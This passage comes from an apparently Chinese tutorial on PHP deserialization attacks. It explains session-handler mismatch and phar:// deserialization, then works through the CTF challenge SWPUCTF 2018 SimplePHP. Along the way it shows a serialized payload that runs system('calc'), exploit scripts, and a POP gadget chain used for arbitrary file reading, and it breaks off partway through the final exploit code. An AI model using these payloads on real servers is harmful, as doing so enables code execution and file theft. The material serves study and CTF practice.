title="（2）session反序列化漏洞"></a>（2）session反序列化漏洞</h4><p>当网站序列化存储session与反序列化读取session方式不同时，就可能导致session反序列化漏洞的产生。一般都是以<code>php_serialize</code>序列化存储session，以PHP反序列化读取session，造成反序列化攻击</p><p>例子：</p><p>phpinfo：</p><p><img src="https://i.loli.net/2021/08/24/C14l6r5eLQp2AmS.png"></p><p>s1.php：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"session.serialize_handler"</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'php_serialize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"h3"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"u"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>s2.php：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">session</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">function</span>  <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里需要说一下<code>unserialize</code>的特性，在执行<code>unserialize</code>的时候，如果字符串前面满足了可被序列化的规则，则后学的字符就会被忽略</p><pre class="line-numbers language-none"><code class="language-none">a:1:{s:2:"h3";s:52:"|O:7:"session":1:{s:3:"var";s:15:"system('calc');";}";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>exp：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">session</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> <span class="token variable">$var</span><span class="token operator">=</span><span class="token double-quoted-string string">"system('calc');"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"|"</span><span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">session</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行结果:</p><p><img src="https://i.loli.net/2021/08/24/UrW1hiGNb3tDOCF.png"></p><p>上文可以给<code>$_SESSION</code>赋值，若代码中不存在给<code>$_SESSION</code>赋值可以利用<code>uplode_process</code>机制，可以在<code>$_SESSION</code>中创建一个键值对，其中的值可以控制</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$key</span><span class="token operator">=</span><span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"session.upload_progress.prefix"</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"session.upload_progress.name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="（3）phar反序列化"><a href="#（3）phar反序列化" class="headerlink" title="（3）phar反序列化"></a>（3）phar反序列化</h4><p>利用条件：</p><pre class="line-numbers language-none"><code class="language-none">-phar文件能够上传到服务器-要有可用的魔术方法作为“跳板”-文件操作函数的参数可控，且：/ \ 等特殊字符没有被过滤有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，受影响的函数如下<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2021/08/24/M5PC2WlcJatqrNS.png"></p><h5 id="例题"><a href="#例题" class="headerlink" title="例题:"></a>例题:</h5><p>[SWPUCTF 2018]SimplePHP</p><p><img src="https://i.loli.net/2021/08/24/rhZvp5VsES6DOzB.png"></p><p>存在任意文件读取</p><p>先来读取一下<code>upload_file.php</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">include</span> <span class="token single-quoted-string string">'function.php'</span><span class="token punctuation">;</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>再来读取一下<code>function.php</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//show_source(__FILE__); </span><span class="token keyword">include</span> <span class="token double-quoted-string string">"base.php"</span><span class="token punctuation">;</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Content-type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">function</span> <span class="token function">upload_file_do</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span>     <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">".jpg"</span><span class="token punctuation">;</span>     <span class="token comment">//mkdir("upload",0777); </span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"upload/"</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"upload/"</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;script type="text/javascript"&gt;alert("上传成功!");&lt;/script&gt;'</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">upload_file_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token function">upload_file_do</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function">upload_file_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span>     <span class="token variable">$allowed_types</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"gif"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jpeg"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jpg"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token comment">//echo "&lt;h4&gt;请选择上传的文件:" . "&lt;h4/&gt;"; </span>    <span class="token punctuation">}</span>     <span class="token keyword">else</span><span class="token punctuation">{</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span><span class="token variable">$allowed_types</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">else</span> <span class="token punctuation">{</span>             <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;script type="text/javascript"&gt;alert("Invalid file!");&lt;/script&gt;'</span><span class="token punctuation">;</span>             <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token delimiter important">?&gt;</span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再读取一下<code>base.php</code></p><p>发现了提示</p><p><img src="https://i.loli.net/2021/08/24/4cLySiwZdTp29NI.png"></p><p>回头再来看<code>class.php</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">C1e4r</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">test</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>   <span class="token comment">//$this-&gt;source = phar://phar.jpg</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'str'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>            <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/http|https|file:|gopher|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"hacker~"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$text</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在Test类中存在敏感操作</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$text</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以反向推poc链</p><p>通过file_get_content来读取我们想要的文件，也就是调用file_get函数，之前分析得知<code>__get-&gt;get-&gt;file_get</code>，所以关键是触发<code>__get</code>方法，那么就要外部访问一个Test类没有或不可访问的属性，我们注意到前面Show类的<code>__tostring</code>方法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>   <span class="token comment">//$this-&gt;source = phar://phar.jpg</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'str'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>            <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/http|https|file:|gopher|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"hacker~"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//把类当作字符串使用时触发</span>   <span class="token punctuation">{</span>       <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'str'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span><span class="token punctuation">;</span>       <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看一下怎么能够触发<code>__toString()</code>方法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">test</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>知要echo <code>test</code>即可</p><p>整条链子为</p><pre class="line-numbers language-none"><code class="language-none">C1e4r::destruct() -&gt; Show::toString() -&gt; Test::__get()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>exp如下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">C1e4r</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C1e4r</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-</span><span class="token 